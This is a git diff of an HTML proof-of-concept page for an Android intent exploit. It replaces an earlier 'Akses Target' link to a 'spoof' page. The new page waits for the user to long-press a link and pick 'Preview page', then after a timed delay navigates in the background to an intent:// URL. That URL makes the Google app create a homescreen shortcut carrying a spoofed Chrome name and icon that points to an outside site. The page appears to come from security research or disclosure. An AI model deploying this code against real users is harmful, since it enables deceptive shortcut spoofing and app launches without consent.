@@ -1,39 +1,103 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PoC Link</title>
-    <style>
-        body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            background-color: #0d1117;
-            font-family: sans-serif;
-        }
-        .btn-link {
-            display: inline-block;
-            padding: 16px 32px;
-            font-size: 16px;
-            font-weight: bold;
-            color: #ffffff;
-            background-color: #238636;
-            text-decoration: none;
-            border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.4);
-            transition: background 0.2s;
-        }
-        .btn-link:hover {
-            background-color: #2ea043;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Android Intent Stable PoC</title>
+  <style>
+    body {
+      font-family: system-ui, -apple-system, sans-serif;
+      background: #f8f9fa;
+      color: #202124;
+      min-height: 100vh;
+      margin: 0;
+      display: grid;
+      place-content: center;
+      text-align: center;
+      padding: 20px;
+    }
+
+    .card {
+      background: white;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+      max-width: 400px;
+    }
+
+    a {
+      display: inline-block;
+      padding: 16px 28px;
+      background: #1a73e8;
+      color: white;
+      text-decoration: none;
+      font-weight: 600;
+      border-radius: 8px;
+      margin-top: 15px;
+      transition: background 0.2s;
+    }
+
+    a:active {
+      background: #1557b0;
+    }
+
+    #status {
+      margin-top: 15px;
+      font-size: 13px;
+      color: #5f6368;
+    }
+  </style>
 </head>
 <body>
 
-    <a href="https://ecdnts-del.github.io/spoof/f.html" class="btn-link">Akses Target</a>
+  <div class="card">
+    <h2>Android Intent PoC</h2>
+    <p>Long-press the link below, then select <b>Preview page</b>.</p>
+    
+    <a href="https://google.com" id="intentLink">
+      Test Link Preview Intent
+    </a>
+
+    <div id="status">Status: Ready</div>
+  </div>
+
+  <script>
+    const link = document.getElementById("intentLink");
+    const statusEl = document.getElementById("status");
+    let isTriggered = false;
+
+    // Memastikan touch event terdeteksi dengan baik di perangkat seluler
+    link.addEventListener("touchstart", () => {
+      if (!isTriggered) {
+        statusEl.textContent = "Status: Touch detected...";
+      }
+    }, { passive: true });
+
+    link.addEventListener("contextmenu", (e) => {
+      if (isTriggered) return;
+      isTriggered = true;
+
+      statusEl.textContent = "Status: Context menu opened. Waiting for preview...";
+
+      // Delay yang disesuaikan (2500ms memberikan waktu optimal bagi Ephemeral Tab untuk terbuka)
+      setTimeout(() => {
+        statusEl.textContent = "Status: Executing Intent trigger!";
+        
+        const intentUrl =
+          "intent://www.google.com/hsi?name=Chrome&icon=https://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";
+
+        // Eksekusi navigasi Intent dari latar belakang
+        window.location.href = intentUrl;
+
+        // Reset state setelah jeda tertentu untuk pengujian berulang
+        setTimeout(() => {
+          isTriggered = false;
+          statusEl.textContent = "Status: Ready (Reset)";
+        }, 1500);
+
+      }, 2500);
+    });
+  </script>
 
 </body>
 </html>
